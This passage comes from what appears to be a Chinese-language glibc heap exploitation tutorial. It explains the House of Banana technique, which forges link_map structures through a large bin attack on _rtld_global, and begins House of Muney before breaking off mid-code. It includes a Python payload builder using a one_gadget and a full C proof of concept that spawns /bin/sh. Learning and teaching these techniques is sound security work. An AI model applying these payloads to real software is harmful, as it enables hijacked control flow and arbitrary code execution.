class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line">    <span class="comment">/* Indexed pointers to dynamic section.</span></span><br><span class="line"><span class="comment">       [0,DT_NUM) are indexed by the processor-independent tags.</span></span><br><span class="line"><span class="comment">       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VERSIONTAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by</span></span><br><span class="line"><span class="comment">       DT_EXTRATAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VALTAGIDX(tagvalue) and</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)</span></span><br><span class="line"><span class="comment">       are indexed by DT_ADDRTAGIDX(tagvalue), see &lt;elf.h&gt;.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span><br><span class="line">		      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Phdr)</span> *l_phdr;	<span class="comment">/* Pointer to program header table in core.  */</span></span><br><span class="line">    ElfW(Addr) l_entry;		<span class="comment">/* Entry point location.  */</span></span><br><span class="line">    ElfW(Half) l_phnum;		<span class="comment">/* Number of program header entries.  */</span></span><br><span class="line">    ElfW(Half) l_ldnum;		<span class="comment">/* Number of dynamic segment entries.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Array of DT_NEEDED dependencies and their dependencies, in</span></span><br><span class="line"><span class="comment">       dependency order for symbol lookup (with and without</span></span><br><span class="line"><span class="comment">       duplicates).  There is no entry before the dependencies have</span></span><br><span class="line"><span class="comment">       been loaded.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> <span class="title">l_searchlist</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We need a special searchlist to process objects marked with</span></span><br><span class="line"><span class="comment">       DT_SYMBOLIC.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> <span class="title">l_symbolic_searchlist</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Dependent object that first caused this object to be loaded.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_loader</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Array with version names.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">l_versions</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_nversions;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Symbol hash table.  */</span></span><br><span class="line">    Elf_Symndx l_nbuckets;</span><br><span class="line">    Elf32_Word l_gnu_bitmask_idxbits;</span><br><span class="line">    Elf32_Word l_gnu_shift;</span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Addr)</span> *l_gnu_bitmask;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="type">const</span> Elf32_Word *l_gnu_buckets;</span><br><span class="line">      <span class="type">const</span> Elf_Symndx *l_chain;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="type">const</span> Elf32_Word *l_gnu_chain_zero;</span><br><span class="line">      <span class="type">const</span> Elf_Symndx *l_buckets;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_direct_opencount; <span class="comment">/* Reference count for dlopen/dlclose.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span>			/* <span class="title">Where</span> <span class="title">this</span> <span class="title">object</span> <span class="title">came</span> <span class="title">from</span>.  */</span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line">	lt_executable,		<span class="comment">/* The main executable program.  */</span></span><br><span class="line">	lt_library,		<span class="comment">/* Library needed by main executable.  */</span></span><br><span class="line">	lt_loaded		<span class="comment">/* Extra run-time loaded shared object.  */</span></span><br><span class="line">      &#125; l_type:<span class="number">2</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_relocated:<span class="number">1</span>;	<span class="comment">/* Nonzero if object&#x27;s relocations done.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_init_called:<span class="number">1</span>; <span class="comment">/* Nonzero if DT_INIT function called.  */</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure></div>

<p>在 _dl_fini 函数中有对 _dl_ns 数组以及 _dl_ns 中的链表 _ns_loaded 的遍历，主要逻辑如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">      __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">      <span class="comment">/* No need to do anything for empty namespaces or those used for</span></span><br><span class="line"><span class="comment">	 auditing DSOs.  */</span></span><br><span class="line">      <span class="keyword">if</span> (nloaded == <span class="number">0</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">	  || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	  )</span><br><span class="line">	__rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Now we can allocate an array to hold all the pointers and</span></span><br><span class="line"><span class="comment">	     copy the pointers in.  */</span></span><br><span class="line">	  <span class="keyword">struct</span> link_map *maps[nloaded];</span><br><span class="line"></span><br><span class="line">	  <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">	  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">	  assert (nloaded != <span class="number">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br><span class="line">	  <span class="keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line">	    <span class="comment">/* Do not handle ld.so in secondary namespaces.  */</span></span><br><span class="line">	    <span class="keyword">if</span> (l == l-&gt;l_real)</span><br><span class="line">	      &#123;</span><br><span class="line">		assert (i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">		maps[i] = l;</span><br><span class="line">		l-&gt;l_idx = i;</span><br><span class="line">		++i;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class="line"><span class="comment">		   are not dlclose()ed from underneath us.  */</span></span><br><span class="line">		++l-&gt;l_direct_opencount;</span><br><span class="line">	      &#125;</span><br><span class="line">	  assert (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line">	  assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br><span class="line">	  <span class="type">unsigned</span> <span class="type">int</span> nmaps = i;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Now we have to do the sorting.  We can skip looking for the</span></span><br><span class="line"><span class="comment">	     binary itself which is at the front of the search list for</span></span><br><span class="line"><span class="comment">	     the main namespace.  */</span></span><br><span class="line">	  _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),</span><br><span class="line">			 <span class="literal">NULL</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* We do not rely on the linked list of loaded object anymore</span></span><br><span class="line"><span class="comment">	     from this point on.  We have our own list here (maps).  The</span></span><br><span class="line"><span class="comment">	     various members of this list cannot vanish since the open</span></span><br><span class="line"><span class="comment">	     count is too high and will be decremented in this loop.  So</span></span><br><span class="line"><span class="comment">	     we release the lock so that some code which might be called</span></span><br><span class="line"><span class="comment">	     from a destructor can directly or indirectly access the</span></span><br><span class="line"><span class="comment">	     lock.  */</span></span><br><span class="line">	  __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* &#x27;maps&#x27; now contains the objects in the right order.  Now</span></span><br><span class="line"><span class="comment">	     call the destructors.  We have to process this array from</span></span><br><span class="line"><span class="comment">	     the front.  */</span></span><br><span class="line">	  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span> =</span> maps[i];</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">if</span> (l-&gt;l_init_called)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">		  l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		  <span class="comment">/* Is there a destructor function?  */</span></span><br><span class="line">		  <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">		      || (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>))</span><br><span class="line">		    &#123;</span><br><span class="line">		      <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">		      <span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)</span><br><span class="line">					    &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">			_dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line">					  DSO_FILENAME (l-&gt;l_name),</span><br><span class="line">					  ns);</span><br><span class="line"></span><br><span class="line">		      <span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">		      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">			&#123;</span><br><span class="line">			  ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">			    (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">					    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">			  <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">					    / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">			  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">			    ((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">			&#125;</span><br><span class="line">            ...</span><br></pre></td></tr></table></figure></div>
<p>这段代码的主要逻辑是遍历 _dl_ns 数组，对于_dl_ns 中的某个元素，将 _ns_loaded 链表中的元素放入 maps 数组然后遍历 maps 数组。对于 maps 数组中的每个元素，如果满足一些条件，最终会调用其中 <code>l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</code> 指向的函数数组中的所有函数。</p>
<p>通过分析可知可以利用 large bin attack 劫持 _rtld_global 的 _ns_loaded 指针然后伪造 link_map 链表从而劫持程序流程。</p>
<p>在伪造 link_map 的时候需要绕过如下检查：</p>
<ul>
<li>为了确保伪造的 link_map 能够加入到 map 数组中，需要令 <code>l_real</code> 指针指向 link_map 结构体自身。    <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> (l == l-&gt;l_real)</span><br><span class="line">   &#123;</span><br><span class="line">assert (i &lt; nloaded);</span><br><span class="line">	</span><br><span class="line">maps[i] = l;</span><br><span class="line">l-&gt;l_idx = i;</span><br><span class="line">++i;</span><br><span class="line">	</span><br><span class="line"><span class="comment">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class="line"><span class="comment">   are not dlclose()ed from underneath us.  */</span></span><br><span class="line">++l-&gt;l_direct_opencount;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div></li>
<li>为了绕过如下检查，需要让 link_map 链表中的元素个数为 4 ，因为 _rtld_global 中的 _ns_nloaded 默认为 4 。  <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">assert (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line">assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br></pre></td></tr></table></figure></div></li>
<li>为了确保能够进入下面的 if 判断，需要让该 link_map 的 l_init_called 位置 1 .  <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (l-&gt;l_init_called)</span><br></pre></td></tr></table></figure></div>
  最终伪造的结构如下图所示，其中 link_map 链表可以伪造到一个 chunk 中，或者将 l_next 指针指向原来的 link_map 链表：<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/d9e1f626bcecb35ba724ac9a80266490.png"
                      alt="在这里插入图片描述"
                ><br>  然而这个 <code>link_map</code> 不能随便伪造，否则过不了 <code>_dl_sort_maps</code> 函数。原作者伪造的 <code>link_map</code> 结构如下：  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/e6dcaa9f3a5093d754c6ff38efdea67c.png"
                      alt="在这里插入图片描述" style="zoom: 25%;" 
                >
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment"># 0</span></span><br><span class="line">payload += p64(link_map_addr + <span class="number">8</span> * <span class="number">2</span> + <span class="number">0x10</span>)  <span class="comment"># 1</span></span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment"># 2</span></span><br><span class="line">payload += p64(link_map_addr)  <span class="comment"># 3</span></span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment"># 4</span></span><br><span class="line">payload += p64(link_map_addr + <span class="number">8</span> * <span class="number">3</span> + <span class="number">0x10</span>)  <span class="comment"># 5</span></span><br><span class="line">payload += p64(link_map_addr + <span class="number">8</span> * <span class="number">8</span> + <span class="number">0x10</span>)  <span class="comment"># 6</span></span><br><span class="line">payload += p64(link_map_addr + <span class="number">8</span> * <span class="number">2</span> + <span class="number">0x10</span>)  <span class="comment"># 7</span></span><br><span class="line">payload += p64(link_map_addr + <span class="number">8</span> * <span class="number">3</span> + <span class="number">0x10</span>)  <span class="comment"># 8</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">4</span></span><br><span class="line">payload += p64(link_map_addr + <span class="number">8</span> * <span class="number">8</span> + <span class="number">0x10</span>)  <span class="comment"># 13</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span> * <span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(link_map_addr + <span class="number">0x30</span> * <span class="number">8</span> + <span class="number">0x10</span>)  <span class="comment"># 0x20 l_info[DT_FINI_ARRAY]</span></span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment"># 0x21</span></span><br><span class="line">payload += p64(link_map_addr + <span class="number">0x23</span> * <span class="number">8</span> + <span class="number">0x10</span>)  <span class="comment"># 0x22 l_info[DT_FINI_ARRAYSZ]</span></span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment"># 0x23 &lt;-l_info[DT_FINI_ARRAYSZ]</span></span><br><span class="line">payload += p64(<span class="number">8</span>)  <span class="comment"># 0x24</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span> * <span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment"># 0x30 &lt;-l_info[DT_FINI_ARRAY]</span></span><br><span class="line">payload += p64(link_map_addr + <span class="number">0x32</span> * <span class="number">8</span> + <span class="number">0x10</span>)  <span class="comment"># 0x31</span></span><br><span class="line">payload += p64(one_gadget)  <span class="comment"># 0x32</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x334</span> - <span class="number">0x10</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p8(<span class="number">1</span> &lt;&lt; <span class="number">4</span>)  <span class="comment"># l-&gt;l_init_called</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<p><a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_banana" >poc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;you hacked me!!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;house of banana&#x27;s poc&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> libc_base = (<span class="type">size_t</span>) &amp;<span class="built_in">puts</span> - <span class="number">0x702e0</span>;</span><br><span class="line">    <span class="type">size_t</span> _rtld_global_ptr_addr = libc_base + <span class="number">0x5e6040</span>;</span><br><span class="line">    <span class="type">char</span> *ptr0 = <span class="built_in">malloc</span>(<span class="number">0x450</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">char</span> *ptr1 = <span class="built_in">malloc</span>(<span class="number">0x440</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">char</span> *ptr2 = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr0);</span><br><span class="line">    <span class="comment">//put ptr9 into large bin</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">free</span>(ptr1); <span class="comment">//free ptr1 into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(ptr2); <span class="comment">//free ptr2 into unsorted bin</span></span><br><span class="line">    <span class="comment">//bk_nextsize = _rtld_global_ptr_addr</span></span><br><span class="line">    *(<span class="type">size_t</span> *) (ptr0 + <span class="number">0x18</span>) = _rtld_global_ptr_addr - <span class="number">0x20</span>;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x410</span>); <span class="comment">//large bin attack to  hijack _rtld_global_ptr</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//fake a _rtld_global</span></span><br><span class="line">    <span class="type">size_t</span> fake_rtld_global_addr = (<span class="type">size_t</span>) (ptr1 - <span class="number">0x10</span>);</span><br><span class="line">    <span class="type">size_t</span> *fake_rtld_global = (<span class="type">size_t</span> *) ptr1;</span><br><span class="line">    <span class="comment">//the chain&#x27;s length must &gt;= 4</span></span><br><span class="line">    fake_rtld_global[<span class="number">1</span>] = (<span class="type">size_t</span>) &amp;fake_rtld_global[<span class="number">2</span>];<span class="comment">//l_next</span></span><br><span class="line">    fake_rtld_global[<span class="number">3</span>] = fake_rtld_global_addr;<span class="comment">//l_real</span></span><br><span class="line"></span><br><span class="line">    fake_rtld_global[<span class="number">2</span> + <span class="number">3</span>] = (<span class="type">size_t</span>) &amp;fake_rtld_global[<span class="number">3</span>];<span class="comment">//l_next</span></span><br><span class="line">    fake_rtld_global[<span class="number">2</span> + <span class="number">5</span>] = (<span class="type">size_t</span>) &amp;fake_rtld_global[<span class="number">2</span>];<span class="comment">//l_real</span></span><br><span class="line"></span><br><span class="line">    fake_rtld_global[<span class="number">3</span> + <span class="number">3</span>] = (<span class="type">size_t</span>) &amp;fake_rtld_global[<span class="number">8</span>];<span class="comment">//l_next</span></span><br><span class="line">    fake_rtld_global[<span class="number">3</span> + <span class="number">5</span>] = (<span class="type">size_t</span>) &amp;fake_rtld_global[<span class="number">3</span>];<span class="comment">//l_real</span></span><br><span class="line"></span><br><span class="line">    fake_rtld_global[<span class="number">8</span> + <span class="number">3</span>] = <span class="number">0</span>;<span class="comment">//l_next</span></span><br><span class="line">    fake_rtld_global[<span class="number">8</span> + <span class="number">5</span>] = (<span class="type">size_t</span>) &amp;fake_rtld_global[<span class="number">8</span>];<span class="comment">//l_real</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//fake a fini_array segment</span></span><br><span class="line">    fake_rtld_global[<span class="number">0x20</span>] = (<span class="type">size_t</span>) &amp;fake_rtld_global[<span class="number">0x30</span>];<span class="comment">//l_info[DT_FINI_ARRAY]</span></span><br><span class="line">    fake_rtld_global[<span class="number">0x22</span>] = (<span class="type">size_t</span>) &amp;fake_rtld_global[<span class="number">0x23</span>];<span class="comment">//l_info[DT_FINI_ARRAYSZ]</span></span><br><span class="line">    fake_rtld_global[<span class="number">0x23</span> + <span class="number">1</span>] = <span class="number">0x8</span>; <span class="comment">//l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span></span><br><span class="line"></span><br><span class="line">    fake_rtld_global[<span class="number">0x31</span>] = <span class="number">0</span>;<span class="comment">//l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</span></span><br><span class="line">    fake_rtld_global[<span class="number">-2</span>] = (<span class="type">size_t</span>) &amp;fake_rtld_global[<span class="number">0x32</span>];<span class="comment">//l_addr</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//funcs</span></span><br><span class="line">    fake_rtld_global[<span class="number">0x32</span>] = (<span class="type">size_t</span>) backdoor;<span class="comment">//array[0]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fake_rtld_global[<span class="number">0x61</span>] = <span class="number">0x800000000</span>;<span class="comment">// l_init_called</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h1 id="House-of-Muney"><a href="#House-of-Muney" class="headerlink" title="House of Muney"></a>House of Muney</h1><p>在 glibc 中如果申请一块很大的内存会调用 <code>mmap</code> 分配一块贴近 glibc 的内存，此时如果修改掉 chunk 头的 size 然后释放掉就会将 glibc 中的部分内存释放掉，此时再次申请一块很大的内存会把释放掉的 glibc 重新申请回来，从而完成对 glibc 的劫持。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/c9185a13808c3e1cf61d21b43ab5eec5.png"
                      alt="在这里插入图片描述"
                ><br>劫持 glibc 后，可以通过伪造延迟绑定相关结构劫持程序执行流程。</p>
<p>在延迟绑定过程有如下调用链：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">_dl_runtime_resolve_xsavec -&gt; _dl_fixup -&gt; _dl_lookup_symbol_x -&gt; do_lookup_x</span><br></pre></td></tr></table></figure></div>
<p><code>do_lookup_x</code> 需要注意的地方写在代码注释中了，<strong>具体需要伪造的结构的位置以及需要伪造的值通过调试确定</strong>。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">__attribute_noinline__</span><br><span class="line"><span class="title function_">do_lookup_x</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *undef_name, <span class="type">uint_fast32_t</span> new_hash,</span></span><br><span class="line"><span class="params">            <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> *old_hash, <span class="type">const</span> ElfW(Sym) *ref,</span></span><br><span class="line"><span class="params">            <span class="keyword">struct</span> sym_val *result, <span class="keyword">struct</span> r_scope_elem *scope, <span class="type">size_t</span> i,</span></span><br><span class="line"><span class="params">            <span class="type">const</span> <span class="keyword">struct</span> r_found_version *<span class="type">const</span> version, <span class="type">int</span> flags,</span></span><br><span class="line"><span class="params">            <span class="keyword">struct</span> link_map *skip, <span class="type">int</span> type_class, <span class="keyword">struct</span> link_map *undef_map)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> n = scope-&gt;r_nlist;</span><br><span class="line">    <span class="comment">/* Make sure we read the value before proceeding.  Otherwise we</span></span><br><span class="line"><span class="comment">       might use r_list pointing to the initial scope and r_nlist being</span></span><br><span class="line"><span class="comment">       the value after a resize.  That is the only path in dl-open.c not</span></span><br><span class="line"><span class="comment">       protected by GSCOPE.  A read barrier here might be to expensive.  */</span></span><br><span class="line">    __asm <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;&quot;</span> : <span class="string">&quot;+r&quot;</span> (n), <span class="string">&quot;+m&quot;</span> (scope-&gt;r_list))</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> **<span class="title">list</span> =</span> scope-&gt;r_list;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span> =</span> <span class="built_in">list</span>[i]-&gt;l_real;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Here come the extra test needed for `_dl_lookup_symbol_skip&#x27;.  */</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">map</span> == skip)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Don&#x27;t search the executable when resolving a copy reloc.  */</span></span><br><span class="line">        <span class="keyword">if</span> ((type_class &amp; ELF_RTYPE_CLASS_COPY) &amp;&amp; <span class="built_in">map</span>-&gt;l_type == lt_executable)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Do not look into objects which are going to be removed.  */</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;l_removed)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Print some debugging info if wanted.  */</span></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_debug_mask) &amp; DL_DEBUG_SYMBOLS))</span><br><span class="line">            _dl_debug_printf(<span class="string">&quot;symbol=%s;  lookup in file=%s [%lu]\n&quot;</span>,</span><br><span class="line">                             undef_name, DSO_FILENAME (<span class="built_in">map</span>-&gt;l_name),</span><br><span class="line">                             <span class="built_in">map</span>-&gt;l_ns);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* If the hash table is empty there is nothing to do here.  */</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;l_nbuckets == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        Elf_Symndx symidx;</span><br><span class="line">        <span class="type">int</span> num_versions = <span class="number">0</span>;</span><br><span class="line">        <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *versioned_sym = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* The tables for this map.  */</span></span><br><span class="line">        <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *symtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (<span class="built_in">map</span>, l_info[DT_SYMTAB]);</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (<span class="built_in">map</span>, l_info[DT_STRTAB]);</span><br><span class="line"></span><br><span class="line">        <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym;</span><br><span class="line">        <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Addr)</span> *bitmask = <span class="built_in">map</span>-&gt;l_gnu_bitmask;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_likely (bitmask != 